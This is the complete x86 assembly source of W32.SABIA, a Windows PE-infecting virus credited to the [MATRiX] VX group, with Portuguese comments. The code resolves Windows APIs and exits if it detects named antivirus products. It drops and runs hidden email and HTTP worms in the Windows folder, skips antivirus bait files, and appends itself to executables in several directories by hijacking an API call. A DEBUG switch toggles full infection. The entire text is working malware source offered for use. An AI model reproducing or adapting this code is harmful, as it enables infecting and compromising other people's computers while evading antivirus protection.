
;                        W32.SABIA (beta)


   .386p
   .model flat
   .code
   jumps

   include \VIRUS\TASM50\INCLUDE\SABIA.INC

   DEBUG EQU TRUE ; TRUE = message box about infected files,
                  ; and will just copy the worms to the windows
                  ; folder (not install). Only GOAT*.* files are
                  ; infected.

                  ; FALSE = no alert about the infection, infect all PE
                  ; files.
                  ; and will install the 2 worms (email and http).


   start:

   pushf
   pushad

   db 233
   maybe@001 dd 0

   ; achar os endereços das api's (funciona em W95/98 ,NT e 2000)
   ; o arquivo precisa ter importado a api GetProcAddress()

   mov eax, 12345678h
   org $-4

   ; imagebase do arquivo (este valor mudará de arquivo p/ arquivo)

   img_base0 dd not 00400000h

   api@001:

   not eax
   call api@003
   mov esp, [esp+8]

   saida@001:

   pop dword ptr fs:[0]
   pop eax

   saida@002:

   popad
   popf

   ; o codigo real do arquivo (antes da infecção)
   ; no futuro vai ter encriptaçao, mas por enquanto
   ; fica assim mesmo [aproveitem AV ;) ]

   dw 25ffh
   chamada@001 dd offset sabia@memory

   api@003:

   push dword ptr fs:[0]
   mov fs:[0], esp

   mov ecx, [eax+60]
   mov edx, [eax+ecx+52]
   cmp eax, edx
   jne saida@001

   api@004:

   mov ebp, edx
   add eax, ecx
   add eax, 128

   ; eax apontando p/ import table
   ; ebp contem a imagebase

   ; a entrada da import table esta em esi

   mov esi, [eax]
   add esi, ebp
   push esi

   ; o limite da import table esta em edi

   mov edi, esi
   add edi, [eax+4]

   ; primeira entrada na import table

   mov eax, 'NREK' xor 'NBK' + 'ANA'
   xor eax, 'NBK' + 'ANA'

   api@007:

   mov edx, [esi+12]
   cmp [edx+ebp], eax
   je api@006
   add esi, 20
   cmp edx, edi
   jb api@007
   pop esi
   jmp saida@001

   ; api's importadas pelo KERNEL achadas

   api@006:

   pop eax
   mov edx, [esi+16]
   add edx, ebp
   mov esi, [esi]
   add esi, ebp
   cmp eax, esi
   je saida@001
   mov ecx, edi

   ; ecx contem o numero de vezes para o loop

   sub ecx, eax
   xor edi, edi

   api@009:

   cmp dword ptr [esi], 0
   je saida@001

   ; cmp byte ptr [esi+3], 128
   ; je api@008
   lodsd
   add eax, ebp
   add eax, 2
   mov ebx, 'PteG' xor 'NBK' + 'ANA' + '<:-P'
   xor ebx, 'NBK' + 'ANA' + '<:-P'
   cmp [eax], ebx
   jne api@008
   xor ebx, 'PteG' xor 'Acor'
   cmp [eax+4], ebx
   jne api@008
   lea edi,[edi*4]
   add edi, edx

   ; pronto, GetProcAddress em [edi]
   ; tentar primeiro o NT, depois W95 e depois W2000

   call api@010

   ; Beep() é uma api presente em todos os sistemas e é
   ; uma palavra bem pequena ;)

   db 'Beep',0

   api@010:

   pop esi
   mov ebx, 077F00000h xor 'NBK' + 'ANA' + 'AUUA'
   xor ebx, 'NBK' + 'ANA' + 'AUUA'

   call api@011
   jnz api@012
   xor ebx, 077F00000h xor 0BFF70000h

   call api@011
   jnz api@012
   xor ebx, 0BFF70000h xor 077E0000h

   call api@011
   jnz api@012

   jmp saida@001

   api@011:

   push esi
   push ebx
   call [edi]
   test eax,eax
   ret

   api@008:

   inc edi
   dec ecx
   jecxz saida@001
   jmp api@009

   api@012:

   ; KERNEL em ebx e GetProcAddress em [edi]

   call api@014

   dd 0,0,0

   api@014:

   pop eax
   push dword ptr [edi]
   pop dword ptr [eax]
   mov [eax+4], ebx
   mov [eax+8], ebp
   mov ebp, eax

   call api@013

   db 'FindFirstFileA',0
   db 'FindNextFileA',0
   db 'DeleteFileA',0
   db 'GetFileSize',0
   db 'SetFileAttributesA',0
   db 'GetCurrentDirectoryA',0
   db 'CreateFileMappingA',0
   db 'MapViewOfFile',0
   db 'UnmapViewOfFile',0
   db 'CreateFileA',0
   db 'CloseHandle',0
   db 'FindClose',0
   db 'GetDriveTypeA',0
   db 'CopyFileA',0
   db 'Sleep',0
   db 'GetWindowsDirectoryA',0
   db 'GetSystemDirectoryA',0
   db 'GetFileAttributesA',0
   db 'SetFilePointer',0
   db 'SetEndOfFile',0
   db 'GetSystemTime',0
   db 'lstrlen',0
   db 'lstrcat',0
   db 'VirtualAlloc',0
   db 'CreateMutexA',0
   db 'CreateThread',0
   db 'GetStartupInfoA',0
   db 'CreateProcessA',0
   db 'LoadLibraryA',0
   db 'GetProcAddress',0
   db 'GetFileTime',0
   db 'SetFileTime',0
   db 'GetTempPathA',0
   db 'lstrcpyA',0,'K'

   api@013:

   pop esi

   call api@015

   FindFirstFileA dd 0
   FindNextFileA dd 0
   DeleteFileA dd 0
   GetFileSize dd 0
   SetFileAttributesA dd 0
   GetCurrentDirectoryA dd 0
   CreateFileMappingA dd 0
   MapViewOfFile dd 0
   UnmapViewOfFile dd 0
   CreateFileA dd 0
   CloseHandle dd 0
   FindClose dd 0
   GetDriveTypeA dd 0
   CopyFileA dd 0
   Sleep dd 0
   GetWindowsDirectoryA dd 0
   GetSystemDirectoryA dd 0
   GetFileAttributesA dd 0
   SetFilePointer dd 0
   SetEndOfFile dd 0
   GetSystemTime dd 0
   lstrlen dd 0
   lstrcat dd 0
   VirtualAlloc dd 0
   CreateMutexA dd 0
   CreateThread dd 0
   GetStartupInfoA dd 0
   CreateProcessA dd 0
   LoadLibraryA dd 0
   GetProcAddressA dd 0
   GetFileTime dd 0
   SetFileTime dd 0
   GetTempPathA dd 0
   lstrcpy dd 0,0

   api@015:

   pop edi

   api@017:

   push esi
   push dword ptr [ebp+4]
   call [ebp]
   stosd
   test eax,eax
   jz saida@001

   api@016:

   lodsb
   test al,al
   jnz api@016
   lodsb
   dec esi
   cmp al, 'K'
   jne api@017

   ; acabamos de achar as api's

   mov ebp, [ebp+8]
   mov ecx, (offset sabia@end - offset start)
   mov esi, 12345678h
   org $-4

   ; onde nosso virus começa na memoria

   img_base1 dd 00401000h
   mov edi, esi
   push edi
   add edi, ecx
   rep movsb

   ; converter agora, os endereços para RUNTIME,
   ; nao mais usando o registrador EBP, como
   ; é de costume nos virus WIN32.

   pop eax
   lea edi, [(eax+(offset worm@001 - offset start))]
   mov ebx, not 00401000h
   not ebx
   mov ecx, offset sabia@memory

   runtime@001:

   dec edi
   cmp edi, eax
   je sabia@001
   cmp dword ptr [edi], ecx
   jae runtime@001
   cmp [edi], ebx
   jb runtime@001
   sub [edi], ebx
   add [edi], eax
   jmp short runtime@001

   sabia@001:

   mov eax, dword ptr [(offset sabia@end+(offset chamada@001 - offset start))]
   mov [chamada@001], eax
   mov [maybe@001], (offset saida@002 - (offset maybe@001+4))

   ; agora que nosso codigo foi convertido para endereços
   ; RUNTIME, podemos chamar tudo diretamente ;-P

   ; verificar se existe algum antivirus ativo na memoria

   push offset user@001
   call [LoadLibraryA]

   test eax, eax
   jz saida@001

   mov [user@002], eax

   push offset user@003
   push eax
   call [GetProcAddressA]

   test eax, eax
   jz saida@001

   mov edi, eax

   test eax, eax
   jz saida@001

   ; array de nomes de antivirus

   mov esi, offset anti@002
   mov ecx, [esi-4]

   anti@005:

   push ecx
   push dword ptr [esi]
   push 0
   call edi

   pop ecx
   test eax, eax
   jnz saida@001

   lodsd
   loop anti@005

   push offset user@004
   push [user@002]
   call [GetProcAddressA]

   test eax, eax
   jz saida@001

   mov [user@005], eax

   anti@001:

   ; achar diretorio do windows, copiar o codigo do WORM

   push MAX_PATH
   mov edi, offset buffer@001
   push edi
   call [GetWindowsDirectoryA]

   test eax,eax
   jz saida@001

   add edi, eax

   push offset buffer@001
   push offset buffer@004
   call [lstrcpy]

   mov eax, '_EI\' xor 'NBK' + 'ANA' + 'TAAT'
   xor eax, 'NBK' + 'ANA' + 'TAAT'
   stosd
   xor eax, '_EI\' xor 'KCAP'
   stosd
   xor eax, 'KCAP' xor 'EXE.'
   stosd
   xor al, al
   stosb

   mov esi, offset worm@001
   call depack@001

   test eax, eax
   jz sabia@002

   IF DEBUG EQ FALSE

   call play@001

   ELSE
   ENDIF

   call HIDE@001

   mov edi, offset buffer@004
   push edi
   call [lstrlen]

   add edi, eax
   mov eax, 'NIW\' xor 'NBK' + 'ANA' + '<:O~'
   xor eax, 'NBK' + 'ANA' + '<:O~'
   stosd
   xor eax, 'NIW\' xor 'D.23'
   stosd
   xor eax, 'D.23' xor 'LL'
   stosd

   push TRUE
   push offset buffer@004
   push offset buffer@001
   call [CopyFileA]

   test eax, eax
   jz sabia@002

   ; devemos infectar a WIN32.DLL agora

   push offset buffer@004
   push offset buffer@001
   call [lstrcpy]

   test eax, eax
   jz sabia@002

   mov eax, [handle@002]
   call infectar@001

   call HIDE@001

   sabia@002:

   push MAX_PATH
   mov edi, offset buffer@001
   push edi
   call [GetWindowsDirectoryA]

   add edi, eax
   mov eax, 'XTM\' xor 'NBK' + 'ANA' + '????'
   xor eax, 'NBK' + 'ANA' + '????'
   stosd
   xor eax, 'XTM\' xor 'XE._'
   stosd
   xor eax, 'XE._' xor 'E'
   stosd

   mov esi, offset worm@002
   call depack@001

   test eax, eax
   jz sabia@003

   IF DEBUG EQ FALSE

   call play@001

   ELSE
   ENDIF

   call HIDE@001

   sabia@003:

   mov edi, offset buffer@006
   push edi
   push MAX_PATH
   call [GetCurrentDirectoryA]

   call sabia@008

   mov edi, offset buffer@006
   push edi
   push MAX_PATH
   call [GetTempPathA]

   call sabia@008

   push MAX_PATH
   mov edi, offset buffer@006
   push edi
   call [GetWindowsDirectoryA]

   call sabia@008

   jmp saida@001

   sabia@008:

   add edi, eax
   cmp byte ptr [edi-1], '\'
   jne sabia@010
   dec edi

   sabia@010:

   IF DEBUG EQ FALSE

   STR1 = '*.*\'
   STR2 = NULL
   STR3 = NULL

   ELSE

   STR1 = 'AOG\'
   STR2 = '*.*T'
   STR3 = NULL

   ENDIF

   mov eax, STR1
   stosd
   mov eax, STR2
   stosd
   mov eax, STR3
   stosd

   push offset buffer@005
   push offset buffer@006
   call [FindFirstFileA]

   mov [handle@007], eax
   inc eax
   jz sabia@011

   sabia@006:

   push offset buffer@006
   mov esi, offset buffer@001
   push esi
   call [lstrcpy]

   push esi
   call [lstrlen]
   add esi, eax

   sabia@009:

   dec esi
   cmp byte ptr [esi], '\'
   jne sabia@009

   mov edi, esi
   inc edi

   mov esi, offset buffer@005.cFileName

   sabia@007:

   lodsb
   stosb
   test al, al
   jnz sabia@007

   cmp byte ptr [buffer@005.cFileName], '.'
   je sabia@004

   mov eax, [buffer@005.nFileSizeLow]

   call infectar@001

   test eax, eax
   jnz sabia@005

   sabia@004:

   push offset buffer@005
   push [handle@007]
   call [FindNextFileA]

   test eax, eax
   jnz sabia@006

   sabia@005:

   push [handle@007]
   call [FindClose]

   sabia@011:

   ret

   IO@001:

   pushad
   mov [handle@002], 0
   push 0
   push 0
   push OPEN_EXISTING
   jmp short IO@003

   IO@002:

   pushad
   push 0
   push 0
   push CREATE_NEW

   IO@003:

   push offset buffer@001
   call [GetFileAttributesA]

   mov [handle@008], eax
   inc eax
   jnz IO@005

   mov [handle@008], FILE_ATTRIBUTE_NORMAL

   IO@005:

   push FILE_ATTRIBUTE_NORMAL
   push offset buffer@001
   call [SetFileAttributesA]

   push 0
   push 1
   push GENERIC_READ or GENERIC_WRITE
   push offset buffer@001
   call [CreateFileA]

   mov [handle@001], eax
   inc eax
   jz IOB@005

   mov eax, offset handle@009
   push eax
   add eax, 8
   push eax
   add eax, 8
   push eax
   push [handle@001]
   call [GetFileTime]

   push 0
   push [handle@001]
   call [GetFileSize]

   cmp [handle@002], 0
   jne IO@004

   mov [handle@002], eax

   IO@004:

   push 0
   push [handle@002]
   push 0
   push 4
   push 0
   push [handle@001]
   call [CreateFileMappingA]

   mov [handle@003], eax

   test eax,eax
   jz IOB@004

   push [handle@002]
   push 0
   push 0
   push 2
   push [handle@003]
   call [MapViewOfFile]

   mov [handle@004], eax

   test eax,eax
   jz IOB@003

   mov [esp+(4*7)], eax
   popad
   ret

   IOB@001:

   pushad

   IOB@002:

   push [handle@004]
   call [UnmapViewOfFile]

   IOB@003:

   push [handle@003]
   call [CloseHandle]

   push 0
   push 0
   push [handle@002]
   push [handle@001]
   call [SetFilePointer]

   push [handle@001]
   call [SetEndOfFile]

   IOB@004:

   mov eax, offset handle@009
   push eax
   add eax, 8
   push eax
   add eax, 8
   push eax
   push [handle@001]
   call [SetFileTime]

   push [handle@001]
   call [CloseHandle]

   IOB@005:

   push [handle@008]
   push offset buffer@001
   call [SetFileAttributesA]

   popad
   xor eax,eax
   ret

   HIDE@001:

   pushad
   push FILE_ATTRIBUTE_HIDDEN OR FILE_ATTRIBUTE_ARCHIVE
   push offset buffer@001
   call [SetFileAttributesA]
   popad
   ret

   ;***************************************************************
   ;*         aPLib v0.22b  -  the smaller the better :)          *
   ;*               WASM & TASM assembler depacker                *
   ;*                                                             *
   ;*   Copyright (c) 1998-99 by  - Jibz -  All Rights Reserved   *
   ;***************************************************************

   _aP_depack_asm:

   push   ebp
   mov    ebp, esp
   pushad
   push   ebp

   mov    esi, [ebp + 8]     ; C calling convention
   mov    edi, [ebp + 12]

   cld
   mov    dl, 80h

   literal:

   movsb

   nexttag:

   call   getbit
   jnc    literal

   xor    ecx, ecx
   call   getbit
   jnc    codepair
   xor    eax, eax
   call   getbit
   jnc    shortmatch
   mov    al, 10h

   getmorebits:

   call   getbit
   adc    al, al
   jnc    getmorebits
   jnz    domatch_with_inc
   stosb
   jmp    short nexttag

   codepair:

   call   getgamma_no_ecx
   dec    ecx
   loop   normalcodepair
   mov    eax,ebp
   call   getgamma
   jmp    short domatch

   shortmatch:

   lodsb
   shr    eax, 1
   jz     donedepacking
   adc    ecx, 2
   mov    ebp, eax
   jmp    short domatch

   normalcodepair:

   xchg   eax, ecx
   dec    eax
   shl    eax, 8
   lodsb
   mov    ebp, eax
   call   getgamma
   cmp    eax, 32000
   jae    domatch_with_2inc
   cmp    eax, 1280
   jae    domatch_with_inc
   cmp    eax, 7fh
   ja     domatch

   domatch_with_2inc:

   inc    ecx

   domatch_with_inc:

   inc    ecx

   domatch:

   push   esi
   mov    esi, edi
   sub    esi, eax
   rep    movsb
   pop    esi
   jmp    short nexttag

   getbit:

   add     dl, dl
   jnz     stillbitsleft
   mov     dl, [esi]
   inc     esi
   adc     dl, dl

   stillbitsleft:

   ret

   getgamma:

   xor    ecx, ecx

   getgamma_no_ecx:

   inc    ecx

   getgammaloop:

   call   getbit
   adc    ecx, ecx
   call   getbit
   jc     getgammaloop
   ret

   donedepacking:

   pop    ebp
   sub    edi, [ebp + 12]
   mov    [ebp - 4], edi     ; return unpacked length in eax

   popad
   pop    ebp
   ret

   buffer@001 db MAX_PATH dup(0)
   name@001 db '_SABIA_',0
            dd 8
   anti@002 dd offset anti@003
            dd offset anti@004
            dd offset anti@006
            dd offset anti@007
            dd offset anti@008
            dd offset anti@009
            dd offset anti@010
            dd offset anti@011
   anti@003 db 'AntiViral Toolkit Pro',0
   anti@004 db 'AVP Monitor',0
   anti@006 db 'Vsstat',0
   anti@007 db 'Webscanx',0
   anti@008 db 'Avconsol',0
   anti@009 db 'McAfee VirusScan',0
   anti@010 db 'Vshwin32',0
   anti@011 db 'Central do McAfee VirusScan',0
   user@001 db 'USER32.DLL',0
   user@003 db 'FindWindowA',0
   user@004 db 'MessageBoxA',0
   aste@001 db '*.*',0

   depack@001:

   ; buffer@001 tem o nome e o path completo do arquivo
   ; esi tem o offset pro codigo compactado

   ; criar arquivo padrao de 16K

   pushad
   mov [handle@002], (1024 * 16)
   call IO@002

   test eax, eax
   jz depack@002

   push eax
   push esi
   call _aP_depack_asm
   add esp, 8

   ; refazendo o tamanho original...

   mov [handle@002], eax

   call IOB@001

   mov eax, [handle@002]

   depack@002:

   mov [esp+(4*7)], eax
   popad
   ret

   play@001:

   pushad
   push offset buffer@002
   call [GetStartupInfoA]

   push offset buffer@003
   push offset buffer@002
   push 0
   push 0
   push 67108928h
   push 0
   push 0
   push 0
   push offset buffer@001
   push 0
   call [CreateProcessA]
   popad
   ret

   infectar@001:

   ; tamanho do arquivo em eax
   ; arquivos menores de 8Kb nao serao infectados

   IF DEBUG EQ TRUE

   pushad
   push 0
   call mena
   db 'Arquivo a ser infectado:',0
   mena:
   push offset buffer@001
   push 0
   call [user@005]
   popad

   ELSE
   ENDIF

   pushad
   mov dword ptr [esp+(4*7)], 0
   mov [handle@002], eax
   mov esi, offset buffer@001
   mov ebp, eax
   xor edx, edx
   mov ecx, 101
   cmp eax, ecx
   jbe infectar@002
   div ecx
   test edx, edx
   jz infectar@002

   cmp ebp, 8192
   ja infectar@003

   push esi
   push esi
   call [lstrlen]
   sub eax, 5
   add esi, eax
   lodsd
   pop esi
   xor eax, 'LD.2'
   jz infectar@003
   xor eax, 'LD.2' xor 'XE.2'
   jnz infectar@002

   infectar@003:

   ; arquivo nao infectado, vamos tentar abri-lo

   call IO@001

   test eax, eax
   jz infectar@002

   cmp word ptr [eax], 'ZM'
   jne infectar@004

   cmp byte ptr [eax+24], 64
   jb infectar@004

   lea ecx, [ebp+eax]
   mov ebx, [eax+60]
   add eax, ebx
   cmp eax, ecx
   jae infectar@004

   mov esi, eax
   lodsw
   xor ax, 'EP' xor '??'
   xor ax, '??'
   jnz infectar@004

   lodsw
   lodsw
   lodsw
   cmp ax, 3
   jbe infectar@004
   dec ax

   ; trabalhamos com WORD

   and eax,0000ffffh
   mov ecx, 40
   sub edx, edx
   mul ecx
   mov ecx, [esi+108]
   add eax, ebx
   shl ecx, 3
   add ecx, eax
   add ecx, 120
   add ecx, [handle@004]

   ; ecx está apontando para o header da ultima seção

   ; seção:
   ; 0-8   nome
   ; 8-12  espaço ocupado na memoria
   ; 12-16 rva da seçao
   ; 16-20 espaço ocupado no arquivo
   ; 20-24 offset para o inicio da seçao
   ; 36-40 flags da seçao

   mov eax, [esi+44]
   test eax, eax
   jz infectar@004
   mov edx, eax
   add edx, [ecx+12]

   cmp dword ptr [ecx+8], 0
   je infectar@004
   cmp dword ptr [ecx+12], 0
   je infectar@004
   cmp dword ptr [ecx+16], 0
   je infectar@004
   cmp dword ptr [ecx+20], 0
   je infectar@004

   ; neste momento:
   ; eax é a IMAGEBASE do arquivo
   ; edx é a IMAGEBASE + o RVA da ultima seção
   ; ecx é um offset para o header da ultima seção
   ; esi é um offset para o header do PE mais 8 bytes (porque mais 8 bytes ?)
   ; ebp é o tamanho do arquivo

   mov edi, [handle@004]
   add ebp, edi
   sub ebp, 20
   push 0
   pop [handle@006]

   infectar@005:

   inc edi
   cmp edi, ebp
   jae infectar@004

   cmp [handle@006], 20
   jae infectar@006

   cmp word ptr [edi], 15ffh
   jne infectar@005

   ; evitar instruções como: mov ax, 15ffh

   cmp dword ptr [edi+2], eax
   jbe infectar@005
   cmp dword ptr [edi+2], edx
   jae infectar@005
   inc [handle@006]
   jmp infectar@005

   infectar@006:

   ; aponta para a DWORD

   inc edi

   ; se nós estamos aqui, provavelmente este deve ser um
   ; arquivo verdadeiro, e nao um teste dos antivirus.
   ; ele possui mais de 20 chamadas a DWORDS (CALL DWORD PTR [XxX])
   ; que sao verdadeiras (pelo menos no meu calculo), isso
   ; indica um codigo com muitas chamadas a api's, os
   ; arquivos-isca dos antivirus (chamados de GOAT files) geralmente
   ; tem apenas UMA chamada a api, provavelmente ExitProcess.

   ; está na hora da infecção :)

   mov ebp, [esi+72]
   test ebp, ebp
   jz infectar@004
   lea ebx, [ebp+(offset sabia@memory - offset start)]

   infectar@007:

   lea ebp, [ebp*2]
   mov [esi+72], ebp
   cmp ebp, ebx
   jb infectar@007

   ; memória geral aumentada...

   mov ebp, [ecx+8]
   lea ebx, [ebp+(offset sabia@memory - offset start)]

   infectar@008:

   lea ebp, [ebp*2]
   mov [ecx+8], ebp
   cmp ebx, ebp
   ja infectar@008

   ; memoria da seção aumentada...

   mov ebp, [ecx+16]
   push ebp
   push dword ptr [ecx+20]
   lea ebx, [ebp+(offset sabia@end - offset start)]

   infectar@009:

   lea ebp, [ebp*2]
   mov [ecx+16], ebp
   cmp ebp, ebx
   jb infectar@009

   ; espaço aumentado...

   or [ecx+36], GENERIC_READ or GENERIC_WRITE

   ; imagebase salva

   not eax
   mov dword ptr [(offset sabia@end + (offset img_base0 - offset start))], eax
   not eax
   mov dword ptr [(offset sabia@end + (offset img_base1 - offset start))], eax
   mov ebp, [ecx+12]
   add dword ptr [(offset sabia@end + (offset img_base1 - offset start))], ebp
   mov ebp, [esp+4]
   add dword ptr [(offset sabia@end + (offset img_base1 - offset start))], ebp

   push dword ptr [edi]
   pop dword ptr [(offset sabia@end + (offset chamada@001 - offset start))]

   ; imagebase em eax

   push dword ptr [(offset sabia@end + (offset img_base1 - offset start))]
   pop dword ptr [edi]
   add dword ptr [edi], (offset img_base1 - offset start)

   ; aumentando arquivo...

   mov eax, [handle@002]
   add eax, (offset sabia@end - offset start)
   sub edx, edx
   mov ecx, 101
   div ecx
   sub edx, edx
   inc eax
   mul ecx
   mov [handle@002], eax
   ; eax contem o novo valor

   call IOB@001
   call IO@001

   test eax, eax
   jz infectar@002

   ; agora so falta copiar o codigo para dentro do arquivo,
   ; adicionando os valores que eu tinha salvo na pilha ao
   ; offset do arquivo mapeado na memoria

   ; nao acredito que to escrevendo essas linhas até essa hora
   ; da madruga (são 01:59), foi dia de malhar o judas, essas
   ; coisas de igreja, cristo e etc... lembrei, páscoa;

   ; comi meu ovo de chocolate todo uns dias atras, hoje
   ; fiquei roubando dos parentes :) .

   ; não sou de ferro, vou dar uma pausa para um cigarrinho...
   ; até daqui a 5 minutos

   ; voltei

   pop ebp
   add eax, ebp
   pop ebp
   add eax, ebp
   mov edi, eax
   mov esi, offset sabia@end
   mov ecx, (offset sabia@end - offset start)
   rep movsb

   mov dword ptr [esp+(4*7)], 1

   IF DEBUG EQ TRUE
   pushad
   push 0
   call mena1
   db 'Arquivo infectado:',0
   mena1:
   push offset buffer@001
   push 0
   call [user@005]
   popad
   ELSE
   ENDIF

   infectar@004:

   call IOB@001

   infectar@002:

   popad
   ret

   db 'SABIÁ ViRuS',13,10
   db 'Software provide by '
   db '[MATRiX] VX TeAm: Ultras, Mort, Nbk, Tgr, Del_Armg0, Anaktos',13,10
   db 'Greetz: All VX guy in #virus and Vecna for help us',13,10
   db 'Visit us at:',13,10
   db 'http://www.coderz.net/matrix',13,10

   worm@001:

   INCLUDE \VIRUS\SABIA\WORM.INC

   worm@002:

   INCLUDE \VIRUS\SABIA\MATRiX.INC

   sabia@end:

   db (offset sabia@end - offset start) dup(0)
   user@002 dd 0
   user@005 dd 0
   buffer@002 STARTUPINFO <0>
   buffer@003 PROCESS_INFORMATION <0>
   buffer@004 db MAX_PATH dup(0)
   buffer@005 WIN32_FIND_DATA <0>
   buffer@006 db MAX_PATH dup(0)
   handle@001 dd 0
   handle@002 dd 0
   handle@003 dd 0
   handle@004 dd 0
   handle@005 dd 0
   handle@006 dd 0
   handle@007 dd 0
   handle@008 dd 0
   handle@009 dd 0,0,0,0,0,0

   sabia@memory:

   dd offset $+4
   push 0
   API ExitProcess
   API GetProcAddress
   API GetModuleHandleA

   .data

   db ?

   end start
   end